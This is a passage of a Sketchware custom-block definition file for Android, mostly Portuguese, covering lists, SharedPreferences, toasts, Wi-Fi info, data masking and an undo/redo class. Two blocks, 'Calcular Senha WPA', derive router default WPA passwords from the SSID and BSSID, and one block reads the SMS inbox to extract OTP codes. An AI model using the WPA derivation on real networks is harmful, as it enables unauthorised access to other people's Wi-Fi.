Record","typeName":"","palette":"233","type":" ","spec":"Update value of column %s.inputOnly  to %s   in table %s.inputOnly  where column name %s.inputOnly  equals %s "},{"code":"%1$s \u003d new HashMap\u003c\u003e();\r","color":"#FFF44336","name":"cadastrar","typeName":"","palette":"234","type":" ","spec":"Novo seletor de item de lista (hashmap) %m.varMap "},{"code":"%1$s.put(%2$s, %3$s);","color":"#FFFF1744","name":"cadastrar chave e valor(repita para cada chave e valor)","typeName":"","palette":"234","type":" ","spec":"hashmap:%m.varMap  cadastrar chave:%s valor:%s.inputOnly "},{"code":"%2$s.add(%1$s);\r","color":"#FFF44336","name":"adicionar map ao listmap","typeName":"","palette":"234","type":" ","spec":"adicionar hashmap:%m.varMap  ao listmap: %m.listMap"},{"code":"%1$s.setAdapter(new Listview1Adapter(%2$s));\r\n((BaseAdapter)%1$s.getAdapter()).notifyDataSetChanged();\r","color":"#FFF44336","name":"atualizar listview","typeName":"","palette":"234","type":" ","spec":"atualizar lista%m.listview com lista %m.listMap "},{"code":"import com.google.gson.Gson","color":"#FFF44336","name":"import","typeName":"","palette":"234","type":"h","spec":"precisa de \"import com.google.gson.Gson;\"  ↓↓↓↓ ou coloque wualquer bloco de Json vazio pra importar automaticamente "},{"code":"%1$s \u003d new Gson().toJson(%2$s);","color":"#FFF44336","name":"armazenar lista em variavel formato json","typeName":"","palette":"234","type":" ","spec":"(precisa \"import com.google.gson.Gson;\")armazenar lista dados em JSON na variavel:%s.inputOnly da listaMap:%m.listMap  "},{"code":"%1$s.edit().putString(%2$s, new Gson().toJson(%3$s)).commit();","color":"#FFF44336","name":"armazenar lista em variavel formato json_copy67","typeName":"","palette":"234","type":" ","spec":"Salvar direto no sharedPreference:%s.inputOnly variável:%s da lista :%m.listMap  "},{"code":"","color":"#FF4CAF50","name":"blocos de pesquisa:","typeName":"","palette":"234","type":"h","spec":"Pesquisar por editText"},{"code":"%1$s \u003d new Gson().fromJson(%2$s.getString(%3$s, \"\"), new TypeToken\u003cArrayList\u003cHashMap\u003cString, Object\u003e\u003e\u003e(){}.getType());\r\nlenght \u003d %1$s.size();\r\nr \u003d lenght - 1;\r\nfor(int _repeat18 \u003d 0; _repeat18 \u003c (int)(lenght); _repeat18++) {\r\n\tvalor%4$s \u003d %1$s.get((int)r).get(%5$s).toString();\r\r\n\tif (!(_charSeq.length() \u003e valor%4$s.length()) \u0026\u0026 valor%4$s.toLowerCase().contains(_charSeq.toLowerCase())) {\r\n\t\t\r\n\t}\r\n\telse {\r\n\t\t%1$s.remove((int)(r));\r\n\t}\r\n\tr--;\r\n}\r\n%6$s.setAdapter(new Listview1Adapter(%1$s));\r\n((BaseAdapter)%6$s.getAdapter()).notifyDataSetChanged();","color":"#FFF44336","name":"finalizar e atualizar lista","typeName":"","palette":"234","type":" ","spec":"pesquisar| no listmap:%m.listMap ChaveSharedPreference:%s.inputOnly valor\u003d%s id de pesquisa:%d valorPesquisa:%s atualizarListView:%m.listview "},{"code":"%1$s \u003d new Gson().fromJson(%2$s.getString(%3$s, \"\"), new TypeToken\u003cArrayList\u003cHashMap\u003cString, Object\u003e\u003e\u003e(){}.getType());\r\nlenght \u003d %1$s.size();\r\nr \u003d lenght - 1;\r\nfor(int _repeat18 \u003d 0; _repeat18 \u003c (int)(lenght); _repeat18++) {\r\n\tvalor%4$s \u003d %1$s.get((int)r).get(%5$s).toString();\r\r\n\tif (!(%7$s.length() \u003e valor%4$s.length()) \u0026\u0026 valor%4$s.toLowerCase().contains(%7$s.toLowerCase())) {\r\n\t\t\r\n\t}\r\n\telse {\r\n\t\t%1$s.remove((int)(r));\r\n\t}\r\n\tr--;\r\n}\r\n%6$s.setAdapter(new Listview1Adapter(%1$s));\r\n((BaseAdapter)%6$s.getAdapter()).notifyDataSetChanged();","color":"#FFF44336","name":"finalizar e atualizar lista_copy25","typeName":"","palette":"234","type":" ","spec":"pesquisar e selecionar editText| no listmap:%m.listMap ChaveSharedPreference:%s.inputOnly valor\u003d%s id de pesquisa:%d valorPesquisa:%s atualizarListView:%m.listview editTextPesquisa:%m.edittext "},{"code":"","color":"#FF4CAF50","name":"repetir pra cada chave","typeName":"","palette":"234","type":"h","spec":"colocar no onBindCustomView da lista"},{"code":"%3$s.setText(%2$s.get((int)_position).get(%1$s).toString());","color":"#FFFF1744","name":"onBindCustomView (repetir pra cada chave)","typeName":"","palette":"234","type":" ","spec":"colocar valor da posição na chave:%s da listmap:%m.listMap  na textView:%m.textview "},{"code":"%2$s.get((int)_position).get(%1$s).toString());","color":"#FFFF1744","name":"onBindCustomView (repetir pra cada chave)_copy76","typeName":"","palette":"234","type":"s","spec":"retornar valor da posição da chave:%s da listmap:%m.listMap "},{"code":"","color":"#FF4CAF50","name":"Retornar item clicado no OnItemClicked","typeName":"","palette":"234","type":"h","spec":"Retornar item clicado no OnItemClicked"},{"code":"%2$s.get((int)_position).get(%1$s).toString()","color":"#FFF44336","name":"Retornar item clicado","typeName":"","palette":"234","type":"s","spec":"Item Clicado retornar valor da chave:%s do listmap:%m.listMap "},{"code":"","color":"#FF4CAF50","name":"#dentro onTextChanged da pesquisa","typeName":"","palette":"234","type":"h","spec":"blocos para retornar tamanho da lista atual:"},{"code":"int %2$s \u003d ((ListAdapter) %1$s.getAdapter()).getCount();","color":"#FFF44336","name":"retornar tamanho listview","typeName":"","palette":"234","type":" ","spec":"definir tamanho da listview:%m.listview na variável de tamanho: %s.inputOnly "},{"code":"String.valueOf(%1$s)","color":"#FFF44336","name":"variavel de tamanho ","typeName":"","palette":"234","type":"s","spec":"retornar variavel de tamanho:%s.inputOnly "},{"code":"","color":"#FF4CAF50","name":"carregar do shared preference","typeName":"","palette":"234","type":"h","spec":"salvar ou carregar dados do sharedpreference"},{"code":"%1$s.edit().putString(%3$s, %2$s).commit();","color":"#FFF44336","name":"salvar","typeName":"","palette":"234","type":" ","spec":"Salvar | SharedPreference:%s.inputOnly  salvar dados JSON  da lista da váriavel:%s.inputOnly  na chave de sharedPreference:%s listMap: %m.listMap "},{"code":"%3$s \u003d new Gson().fromJson(%2$s.getString(%1$s, \"\"), new TypeToken\u003cArrayList\u003cHashMap\u003cString, Object\u003e\u003e\u003e(){}.getType());","color":"#FFF44336","name":"carregar","typeName":"","palette":"234","type":" ","spec":"Carregar | dados:%s do sharedPreference:%s.inputOnly  no listmap:%m.listMap "},{"code":"%1$s","color":"#FFB0B0B0","name":"colorr","typeName":"","palette":"235","type":"s","spec":"color: %m.color "},{"code":"Vibrator %1$s \u003d (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);\n%1$s.vibrate(%2$s);","color":"#FF00ACC1","name":"Vibrar Dispositivo","typeName":"","palette":"236","type":" ","spec":"Vibratorcomponent:%s.inputOnly Vibrar dispositivo por %d milissegundos"},{"code":"wifiManager.setWifiEnabled(true);","color":"#FF2196F3","name":"lifar wifi","typeName":"","palette":"231","type":" ","spec":"ligar wifi"},{"code":"wifiManager.setWifiEnabled(false);","color":"#FF2196F3","name":"desligar wifi ","typeName":"","palette":"231","type":" ","spec":"desligar wifi"},{"code":"%1$s \u003d (WifiManager)getSystemService(getApplicationContext().WIFI_SERVICE);\n%2$s \u003d %1$s.getConnectionInfo();","color":"#FF1E88E5","name":"WifiManager","typeName":"","palette":"231","type":" ","spec":"create %m.WifiManager \u0026 %m.WifiInfo On Create"},{"code":"%1$s.getSSID()","color":"#FF1E88E5","name":"getSSID","typeName":"","palette":"231","type":"s","spec":"%m.WifiInfo get SSID"},{"code":"%1$s.getBSSID()","color":"#FF1E88E5","name":"getBSSID","typeName":"","palette":"231","type":"s","spec":"%m.WifiInfo get BSSID"},{"code":"%1$s.getMacAddress()","color":"#FF1E88E5","name":"getMacAddress","typeName":"","palette":"231","type":"s","spec":"%m.WifiInfo get MaxAddress"},{"code":"%1$s.getFrequency() + WifiInfo.FREQUENCY_UNITS","color":"#FF1E88E5","name":"getFrequency","typeName":"","palette":"231","type":"s","spec":"%m.WifiInfo get Frequency"},{"code":"%1$s.getLinkSpeed() + WifiInfo.LINK_SPEED_UNITS","color":"#FF1E88E5","name":"getLinkSpeed","typeName":"","palette":"231","type":"s","spec":"%m.WifiInfo get LinkSpeed"},{"code":"String.valueOf((long) %1$s.getRssi())","color":"#FF1E88E5","name":"getRssi","typeName":"","palette":"231","type":"s","spec":"%m.WifiInfo get Rssi"},{"code":"String.format(%2$s,(%1$s.getIpAddress() \u0026 0xff),(%1$s.getIpAddress() \u003e\u003e 8 \u0026 0xff),\r(%1$s.getIpAddress() \u003e\u003e 16 \u0026 0xff),(%1$s.getIpAddress() \u003e\u003e 24 \u0026 0xff))","color":"#FF1E88E5","name":"getIPAddress","typeName":"","palette":"231","type":"s","spec":"%m.WifiInfo get IP Address with type %s"},{"code":"SketchwareUtil.CustomToastWithIcon(getApplicationContext(), %1$s, %2$s, %3$s, %4$s, %5$s SketchwareUtil.TOP, R.drawable.%6$s);","color":"#FF673AB7","name":"TopToast_copy85","typeName":"","palette":"237","type":" ","spec":"ToastTopoIcone texto:%s  corDoTexto:%m.color TamanhoTexto:%d corFundo:%m.color borderRadius:%d Ícone :%m.imageview "},{"code":"SketchwareUtil.CustomToastWithIcon(getApplicationContext(), %1$s, %2$s, %3$s, %4$s, %5$s SketchwareUtil.CENTER, R.drawable.%6$s);","color":"#FF673AB7","name":"CenterToast_copy41","typeName":"","palette":"237","type":" ","spec":"ToastCentroIcone texto:%s  corDoTexto:%m.color TamanhoTexto:%d corFundo:%m.color borderRadius:%d Ícone :%m.imageview "},{"code":"SketchwareUtil.CustomToastWithIcon(getApplicationContext(), %1$s, %2$s, %3$s, %4$s, %5$s SketchwareUtil.BOTTOM, R.drawable.%6$s);","color":"#FF673AB7","name":"BottomToast com ícone ","typeName":"","palette":"237","type":" ","spec":"ToastEmbaixoIcone texto:%s  corDoTexto:%m.color TamanhoTexto:%d corFundo:%m.color borderRadius:%d Ícone :%m.imageview "},{"code":"SketchwareUtil.CustomToastWithIcon(getApplicationContext(), %1$s, %2$s, %3$s, %4$s, %5$s SketchwareUtil.TOP);","color":"#FF673AB7","name":"TopToast sem icone_copy55","typeName":"","palette":"237","type":" ","spec":"ToastTopo texto:%s  corDoTexto:%m.color TamanhoTexto:%d corFundo:%m.color borderRadius:%d "},{"code":"SketchwareUtil.CustomToastWithIcon(getApplicationContext(), %1$s, %2$s, %3$s, %4$s, %5$s, SketchwareUtil.CENTER);","color":"#FF673AB7","name":"CenterToast sem icone_copy37","typeName":"","palette":"237","type":" ","spec":"ToastCentro texto:%s  corDoTexto:%m.color TamanhoTexto:%d CorFundo:%m.color borderRadius:%d "},{"code":"SketchwareUtil.CustomToast(getApplicationContext(), %1$s, %2$s, %3$s, %4$s, %5$s, SketchwareUtil.BOTTOM);","color":"#FF673AB7","name":"BottomToast sem ícone _copy92","typeName":"","palette":"237","type":" ","spec":"ToastEmbaixo texto:%s  corDoTexto:%m.color TamanhoTexto:%d CorFundo:%m.color borderRadius:%d  "},{"code":"String %1$s \u003d \"\";\ntry {\n    PackageInfo pInfo \u003d getPackageManager().getPackageInfo(getPackageName(), 0);\n    %1$s \u003d pInfo.versionName;\n} catch (PackageManager.NameNotFoundException e) {\n    e.printStackTrace();\n}","color":"#FF00ACC1","name":"Obter Versão do App","typeName":"","palette":"178","type":" ","spec":"Obter versão do aplicativo e armazenar em %s.inputOnly"},{"code":"%1$s","color":"#FF2196F3","name":"Retornar Versão do App","typeName":"","palette":"178","type":"s","spec":"Retorna a versão do aplicativo da variavel %s.inputOnly"},{"code":"String ssidEnd \u003d \"\";\nif (%2$s.contains(\"2G\")) {\n    ssidEnd \u003d %2$s.substring(%2$s.indexOf(\"2G\") + 2);\n} else if (%2$s.contains(\"5G\")) {\n    ssidEnd \u003d %2$s.substring(%2$s.indexOf(\"5G\") + 2);\n}\nString bssidDigits \u003d %3$s.replaceAll(\":\", \"\").substring(4, 6);\nfinal String %1$s \u003d bssidDigits + ssidEnd;","color":"#FF00ACC1","name":"Calcular Senha WPA","typeName":"","palette":"238","type":" ","spec":"Calcular senha WPA e armazenar na variavel :%s.inputOnly usando SSID %s e BSSID %s"},{"code":"// Inicializa ssidEnd\nString ssidEnd \u003d \"\";\nif (%2$s !\u003d null) {\n    if (%2$s.startsWith(\"NET_2G\")) {\n        ssidEnd \u003d %2$s.substring(6); // 6 para pular \"NET_2G\"\n    } else if (%2$s.startsWith(\"NET_5G\")) {\n        ssidEnd \u003d %2$s.substring(6); // 6 para pular \"NET_5G\"\n    } else if (%2$s.startsWith(\"2G\")) {\n        ssidEnd \u003d %2$s.substring(2); // 2 para pular \"2G\"\n    } else if (%2$s.startsWith(\"5G\")) {\n        ssidEnd \u003d %2$s.substring(2); // 2 para pular \"5G\"\n    } else if (%2$s.startsWith(\"CLARO_\")) {\n        ssidEnd \u003d %2$s.substring(6); // 6 para pular \"CLARO_\"\n    } else if (%2$s.startsWith(\"CLARO\")) {\n        ssidEnd \u003d %2$s.substring(5); // 5 para pular \"CLARO\"\n    } else if (%2$s.startsWith(\"_\")) {\n        ssidEnd \u003d %2$s.substring(1); // 1 para pular \"_\"\n    } else {\n        ssidEnd \u003d %2$s; // Usa o SSID completo se não começar com nenhum dos prefixos\n    }\n}\n\n// Inicializa bssidDigits e adiciona verificação para o BSSID\nString bssidDigits \u003d \"\";\nif (%3$s !\u003d null \u0026\u0026 %3$s.length() \u003e\u003d 17) {\n    // Remove os dois pontos do BSSID e obtém os dígitos específicos\n    bssidDigits \u003d %3$s.replaceAll(\":\", \"\").substring(4, 6);\n}\n\n// Combina bssidDigits e ssidEnd para formar a String final\nfinal String %1$s \u003d bssidDigits + ssidEnd;","color":"#FF00ACC1","name":"Calcular Senha WPA_copy32","typeName":"","palette":"238","type":" ","spec":"AllFormat | Calcular senha WPA e armazenar na variavel :%s.inputOnly usando SSID %s e BSSID %s"},{"code":"%1$s","color":"#FF2196F3","name":"Retornar Senha WPA","typeName":"","palette":"238","type":"s","spec":"Retorna a senha WPA armazenada em %s.inputOnly"},{"code":"WifiManager wifiManager \u003d (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);\nboolean %1$s \u003d wifiManager.isWifiEnabled();","color":"#FF00ACC1","name":"Verificar Status do Wi-Fi","typeName":"","palette":"231","type":" ","spec":"Verifica o status do Wi-Fi e armazena na variavel:%s.inputOnly"},{"code":"%1$s","color":"#FF2196F3","name":"Retornar Status do Wi-Fi","typeName":"","palette":"231","type":"b","spec":"Retorna o status do Wi-Fi armazenado em %s.inputOnly"},{"code":"WifiManager wifiManager \u003d (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);\nboolean enabled \u003d wifiManager.isWifiEnabled();\r\nif (enabled) {\r\n\tSketchwareUtil.showMessage(getApplicationContext(), \"wifi ja está ligado\");\r\n}\r\nelse {\r\n\twifiManager.setWifiEnabled(true);\r\n}","color":"#FF2196F3","name":"Ligar quando não estiver ligado","typeName":"","palette":"231","type":" ","spec":"Ligar wifi quando se não estiver ligado"},{"code":"WifiManager wifiManager \u003d (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);\nList\u003cScanResult\u003e scanResults \u003d wifiManager.getScanResults();\nList\u003cMap\u003cString, Object\u003e\u003e wifiList \u003d new ArrayList\u003c\u003e();\nfor (ScanResult scanResult : scanResults) {\n    Map\u003cString, Object\u003e wifiInfo \u003d new HashMap\u003c\u003e();\n    wifiInfo.put(\"SSID\", scanResult.SSID);\n    wifiInfo.put(\"BSSID\", scanResult.BSSID);\n    wifiInfo.put(\"capabilities\", scanResult.capabilities);\n    wifiInfo.put(\"frequency\", scanResult.frequency);\n    wifiInfo.put(\"level\", scanResult.level);\n    wifiList.add(wifiInfo);\n}\nString %1$s \u003d new Gson().toJson(wifiList);","color":"#FF00ACC1","name":"Obter Redes Wi-Fi e Salvar em JSON","typeName":"","palette":"231","type":" ","spec":"Obtém as redes Wi-Fi atuais e salva na variavel :%s.inputOnly"},{"code":"%1$s","color":"#FF2196F3","name":"Retornar JSON de Redes Wi-Fi","typeName":"","palette":"231","type":"s","spec":"Retorna o JSON das redes Wi-Fi armazenado na variavel :%s.inputOnly"},{"code":"String otp \u003d \"\";\nUri uri \u003d Uri.parse(\"content://sms/inbox\");\nContentResolver contentResolver \u003d getContentResolver();\nCursor cursor \u003d contentResolver.query(uri, null, null, null, \"date DESC\");\nif (cursor !\u003d null) {\n    while (cursor.moveToNext()) {\n        String body \u003d cursor.getString(cursor.getColumnIndexOrThrow(\"body\"));\n        if (body.contains(%1$s)) {\n            Pattern pattern \u003d Pattern.compile(\"\\\\d{6}\");\n            Matcher matcher \u003d pattern.matcher(body);\n            if (matcher.find()) {\n                otp \u003d matcher.group();\n                break;\n            }\n        }\n    }\n    cursor.close();\n}\n%2$s \u003d otp;","color":"#FF00ACC1","name":"Pegar OTP da Mensagem SMS Mais Recente","typeName":"","palette":"239","type":" ","spec":"Pega o número de confirmação OTP da mensagem SMS mais recente que contém %s.inputOnly (parte da mensagem) e salva em %s.inputOnly (variável de resultado)"},{"code":"","color":"#FF4CAF50","name":"deletar item,salvar e refresh list","typeName":"","palette":"234","type":"h","spec":"deletar,salvar e recarregar lista"},{"code":"%3$s.remove((int)(_position));\r\n%1$s.edit().putString(%2$s, new Gson().toJson(%3$s)).commit();\r\n((BaseAdapter)%4$s.getAdapter()).notifyDataSetChanged();","color":"#FFF44336","name":"Delete item,Save list to json,Refresh List (repetir pra cada chave)","typeName":"","palette":"234","type":" ","spec":"Deletar item clicado,SharedPreference:%s.inputOnly | salvar dados da chave %s como Json usando listmap:%m.listMap ,e recarregar listview:%m.listview "},{"code":"","color":"#FF4CAF50","name":"atualizar valor na lista","typeName":"","palette":"234","type":"h","spec":"atualizar valor"},{"code":"%3$s.get((int)_position).put(%1$s, %2$s);","color":"#FFF44336","name":"atualizar valor (repetir pra cada chave)","typeName":"","palette":"234","type":" ","spec":"atualizar valor| chave:%s \u003d novo valor:%s  no listmap:%m.listMap "},{"code":"String cpf \u003d %1$s;\nif (!cpf.contains(\".\") \u0026\u0026 !cpf.contains(\"-\")) {\n    cpf \u003d cpf.substring(0, 3) + \".\" + cpf.substring(3, 6) + \".\" + cpf.substring(6, 9) + \"-\" + cpf.substring(9, 11);\n}\nString cpfCensurado \u003d \"***.\" + cpf.substring(4, 7) + \".\" + cpf.substring(8, 11) + \"-**\";\nString %2$s \u003d cpfCensurado;","color":"#FF00ACC1","name":"Censurar CPF","typeName":"","palette":"240","type":" ","spec":"Colocar \".\" e \"-\" eCensurar cpf %s e retornar na variavel:%s.inputOnly"},{"code":"%1$s","color":"#FF2196F3","name":"Retornar CPF Censurado","typeName":"String","palette":"240","type":"s","spec":"Retorna a variável censurada %s.inputOnly"},{"code":"String cpf \u003d %1$s;\nif (!cpf.contains(\".\") \u0026\u0026 !cpf.contains(\"-\")) {\n    cpf \u003d cpf.substring(0, 3) + \".\" + cpf.substring(3, 6) + \".\" + cpf.substring(6, 9) + \"-\" + cpf.substring(9, 11);\nString cpfConvertido \u003d %2$s;\n}","color":"#FF00ACC1","name":"Adicionar Pontos e Traço ao CPF","typeName":"","palette":"240","type":" ","spec":"adicionar \".\" e \"-\" no cpf:%s e retornar na variavel:%s.inputOnly "},{"code":"%1$s","color":"#FF2196F3","name":"Retornar CPF Censurado_copy51","typeName":"String","palette":"240","type":"s","spec":"Retorna a variável convertida %s.inputOnly"},{"code":"String email \u003d %1$s;\nint atIndex \u003d email.indexOf(\u0027@\u0027);\nString username \u003d email.substring(0, atIndex);\nString domain \u003d email.substring(atIndex);\nString censoredUsername \u003d username.charAt(0) + \"**************\" + username.charAt(username.length() - 1);\nString censoredEmail \u003d censoredUsername + domain;\nString %2$s \u003d censoredEmail;","color":"#FF00ACC1","name":"Censurar Email","typeName":"","palette":"240","type":" ","spec":"Censurar email:%s e retornar em %s.inputOnly"},{"code":"%1$s","color":"#FF2196F3","name":"Retornar email censurado","typeName":"","palette":"240","type":"s","spec":"Retornar email censurado %s.inputOnly "},{"code":"%2$s.loadUrl(\"data:text/html,\"+%1$s);","color":"#FF2196F3","name":"Load HTML","typeName":"","palette":"229","type":" ","spec":"Carregar código html:%s  na webView:%m.webview"},{"code":"","color":"#FF009688","name":"_copy91","typeName":"","palette":"241","type":"h","spec":"todos blocos dentro do OnCreate"},{"code":"final UndoRedoFunction undoredo%1$s \u003d new UndoRedoFunction(%2$s);","color":"#FF009688","name":"create undoredo id set in","typeName":"","palette":"241","type":" ","spec":"create undoredo id %d set in %m.edittext"},{"code":"//Undo View\r\n%1$s.setOnClickListener (new View.OnClickListener() {\n\t@Override\n\t          public void onClick(View v) {\n\t\t            %2$s\n\t\t          }\n});","color":"#FF009688","name":"undo undo text","typeName":"","palette":"241","type":"c","spec":"%m.view on clicked"},{"code":"","color":"#FF009688","name":"","typeName":"","palette":"241","type":"h","spec":"put inside of on clicked[By BD King]"},{"code":"undoredo%1$s.%2$s();","color":"#FF009688","name":"undoredo undoredofunctuon id function","typeName":"","palette":"241","type":" ","spec":"undoredo id %d function %s"},{"code":"undo","color":"#FF009688","name":"undoredo undo","typeName":"","palette":"241","type":"s","spec":"undo"},{"code":"redo","color":"#FF009688","name":"undoredo redo","typeName":"","palette":"241","type":"s","spec":"redo"},{"code":"","color":"#FF009688","name":"","typeName":"","palette":"241","type":"h","spec":"add only once at the end of block [By Rakib Islam ]"},{"code":"}\r\npublic class UndoRedoFunction {\n\t\n\tprivate boolean mIsUndoOrRedo \u003d false;\n\tprivate EditHistory mEditHistory;\n\tprivate EditTextChangeListener mChangeListener;\n\tprivate TextView mTextView;\n\n\t\n\tpublic UndoRedoFunction(TextView textView) {\n\t\t\tmTextView \u003d textView;\n\t\t\tmEditHistory \u003d new EditHistory();\n\t\t\tmChangeListener \u003d new EditTextChangeListener();\n\t\t\tmTextView.addTextChangedListener(mChangeListener);\n\t}\n\n\tpublic void disconnect() {\n\t\t\tmTextView.removeTextChangedListener(mChangeListener);\n\t}\n//By THEBI3ST\n\tpublic void setMaxHistorySize(int maxHistorySize) {\n\t\t\tmEditHistory.setMaxHistorySize(maxHistorySize);\n\t}\n\n\tpublic void clearHistory() {\n\t\t\tmEditHistory.clear();\n\t}\n\n\t\n\tpublic boolean getCanUndo() {\n\t\t\treturn (mEditHistory.mmPosition \u003e 0);\n\t}\n\n\tpublic void undo() {\n\t\t\tEditItem edit \u003d mEditHistory.getPrevious();\n\t\t\tif (edit \u003d\u003d null) {\n\t\t\t\t\treturn;\n\t\t\t}\n\t\n\t\t\tEditable text \u003d mTextView.getEditableText();\n\t\t\tint start \u003d edit.mmStart;\n\t\t\tint end \u003d start + (edit.mmAfter !\u003d null ? edit.mmAfter.length() : 0);\n\t\n\t\t\tmIsUndoOrRedo \u003d true;\n\t\t\ttext.replace(start, end, edit.mmBefore);\n\t\t\tmIsUndoOrRedo \u003d false;\n\t\n\t\t\tfor (Object o : text.getSpans(0, text.length(), android.text.style.UnderlineSpan.class)) {\n\t\t\t\t\ttext.removeSpan(o);\n\t\t\t}//xenondry\n\t\n\t\t\tSelection.setSelection(text, edit.mmBefore \u003d\u003d null ? start\n\t\t\t\t\t: (start + edit.mmBefore.length()));\n\t}\n\n\tpublic boolean getCanRedo() {\n\t\t\treturn (mEditHistory.mmPosition \u003c mEditHistory.mmHistory.size());\n\t}\n\n\tpublic void redo() {\n\t\t\tEditItem edit \u003d mEditHistory.getNext();\n\t\t\tif (edit \u003d\u003d null) {\n\t\t\t\t\treturn;\n\t\t\t}\n\t//JustMax\n\t\t\tEditable text \u003d mTextView.getEditableText();\n\t\t\tint start \u003d edit.mmStart;\n\t\t\tint end \u003d start + (edit.mmBefore !\u003d null ? edit.mmBefore.length() : 0);\n\t\n\t\t\tmIsUndoOrRedo \u003d true;\n\t\t\ttext.replace(start, end, edit.mmAfter);\n\t\t\tmIsUndoOrRedo \u003d false;\n\t\n\t\t\tfor (Object o : text.getSpans(0, text.length(), android.text.style.UnderlineSpan.class)) {\n\t\t\t\t\ttext.removeSpan(o);\n\t\t\t}\n\t\n\t\t\tSelection.setSelection(text, edit.mmAfter \u003d\u003d null ? start\n\t\t\t\t\t: (start + edit.mmAfter.length()));\n\t}\n\n\tpublic void storePersistentState(android.content.SharedPreferences.Editor editor, String prefix) {\n\t\n\t\t\teditor.putString(prefix + \".hash\",\n\t\t\t\t\tString.valueOf(mTextView.getText().toString().hashCode()));\n\t\t\teditor.putInt(prefix + \".maxSize\", mEditHistory.mmMaxHistorySize);\n\t\t\teditor.putInt(prefix + \".position\", mEditHistory.mmPosition);\n\t\t\teditor.putInt(prefix + \".size\", mEditHistory.mmHistory.size());\n\t\n\t\t\tint i \u003d 0;\n\t\t\tfor (EditItem ei : mEditHistory.mmHistory) {\n\t\t\t\t\tString pre \u003d prefix + \".\" + i;\n\t\t\n\t\t\t\t\teditor.putInt(pre + \".start\", ei.mmStart);\n\t\t\t\t\teditor.putString(pre + \".before\", ei.mmBefore.toString());\n\t\t\t\t\teditor.putString(pre + \".after\", ei.mmAfter.toString());\n\t\t\n\t\t\t\t\ti++;\n\t\t\t}\n\t}\n\n\tpublic boolean restorePersistentState(SharedPreferences sp, String prefix)\n\t\t\tthrows IllegalStateException {\n\t\n\t\t\tboolean ok \u003d doRestorePersistentState(sp, prefix);\n\t\t\tif (!ok) {\n\t\t\t\t\tmEditHistory.clear();\n\t\t\t}\n\t\n\t\t\treturn ok;\n\t}\n\n\tprivate boolean doRestorePersistentState(SharedPreferences sp, String prefix) {\n\t\n\t\t\tString hash \u003d sp.getString(prefix + \".hash\", null);\n\t\t\tif (hash \u003d\u003d null) {\n\t\t\t\t\treturn true;\n\t\t\t}\n\t\n\t\t\tif (Integer.valueOf(hash) !\u003d mTextView.getText().toString().hashCode()) {\n\t\t\t\t\treturn false;\n\t\t\t}\n\t\n\t\t\tmEditHistory.clear();\n\t\t\tmEditHistory.mmMaxHistorySize \u003d sp.getInt(prefix + \".maxSize\", -1);\n\t\n\t\t\tint count \u003d sp.getInt(prefix + \".size\", -1);\n\t\t\tif (count \u003d\u003d -1) {\n\t\t\t\t\treturn false;\n\t\t\t}\n\t\n\t\t\tfor (int i \u003d 0; i \u003c count; i++) {\n\t\t\t\t\tString pre \u003d prefix + \".\" + i;\n\t\t\n\t\t\t\t\tint start \u003d sp.getInt(pre + \".start\", -1);\n\t\t\t\t\tString before \u003d sp.getString(pre + \".before\", null);\n\t\t\t\t\tString after \u003d sp.getString(pre + \".after\", null);\n\t\t\n\t\t\t\t\tif (start \u003d\u003d -1 || before \u003d\u003d null || after \u003d\u003d null) {\n\t\t\t\t\t\t\treturn false;\n\t\t\t\t\t}\n\t\t\t\t\tmEditHistory.add(new EditItem(start, before, after));\n\t\t\t}\n\t\n\t\t\tmEditHistory.mmPosition \u003d sp.getInt(prefix + \".position\", -1);\n\t\t\tif (mEditHistory.mmPosition \u003d\u003d -1) {\n\t\t\t\t\treturn false;\n\t\t\t}\n\t\n\t\t\treturn true;\n\t}\n\n\tprivate final class EditHistory {\n\t\n\t\t\tprivate int mmPosition \u003d 0;\n\t\t\tprivate int mmMaxHistorySize \u003d -1;\n\t\t\tprivate final LinkedList\u003cEditItem\u003e mmHistory \u003d new LinkedList\u003cEditItem\u003e();\n\t\t\tprivate void clear() {\n\t\t\t\t\tmmPosition \u003d 0;\n\t\t\t\t\tmmHistory.clear();\n\t\t\t}\n\t\n\t\t\tprivate void add(EditItem item) {\n\t\t\t\t\twhile (mmHistory.size() \u003e mmPosition) {\n\t\t\t\t\t\t\tmmHistory.removeLast();\n\t\t\t\t\t}\n\t\t\t\t\tmmHistory.add(item);\n\t\t\t\t\tmmPosition++;\n\t\t\n\t\t\t\t\tif (mmMaxHistorySize \u003e\u003d 0) {\n\t\t\t\t\t\t\ttrimHistory();\n\t\t\t\t\t}\n\t\t\t}\n\t\n\t\t\tprivate void setMaxHistorySize(int maxHistorySize) {\n\t\t\t\t\tmmMaxHistorySize \u003d maxHistorySize;\n\t\t\t\t\tif (mmMaxHistorySize \u003e\u003d 0) {\n\t\t\t\t\t\t\ttrimHistory();\n\t\t\t\t\t}\n\t\t\t}\n\t\n\t\t\tprivate void trimHistory() {\n\t\t\t\t\twhile (mmHistory.size() \u003e mmMaxHistorySize) {\n\t\t\t\t\t\t\tmmHistory.removeFirst();\n\t\t\t\t\t\t\tmmPosition--;\n\t\t\t\t\t}\n\t\t\n\t\t\t\t\tif (mmPosition \u003c 0) {\n\t\t\t\t\t\t\tmmPosition \u003d 0;\n\t\t\t\t\t}\n\t\t\t}\n\t\n\t\t\tprivate EditItem getPrevious() {\n\t\t\t\t\tif (mmPosition \u003d\u003d 0) {\n\t\t\t\t\t\t\treturn null;\n\t\t\t\t\t}\n\t\t\t\t\tmmPosition--;\n\t\t\t\t\treturn mmHistory.get(mmPosition);\n\t\t\t}\n\t\n\t\t\tprivate EditItem getNext() {\n\t\t\t\t\tif (mmPosition \u003e\u003d mmHistory.size()) {\n\t\t\t\t\t\t\treturn null;\n\t\t\t\t\t}\n\t\t\n\t\t\t\t\tEditItem item \u003d mmHistory.get(mmPosition);\n\t\t\t\t\tmmPosition++;\n\t\t\t\t\treturn item;\n\t\t\t}\n\t}\n\n\tprivate final class EditItem {\n\t\t\tprivate final int mmStart;\n\t\t\tprivate final CharSequence mmBefore;\n\t\t\tprivate final CharSequence mmAfter;\n\t\n\t\t\tpublic EditItem(int start, CharSequence before, CharSequence after) {\n\t\t\t\t\tmmStart \u003d start;\n\t\t\t\t\tmmBefore \u003d before;\n\t\t\t\t\tmmAfter \u003d after;\n\t\t\t}\n\t}\n\n\tprivate final class EditTextChangeListener implements TextWatcher {\n\t\n\t\t\tprivate CharSequence mBeforeChange;\n\t\t\tprivate CharSequence 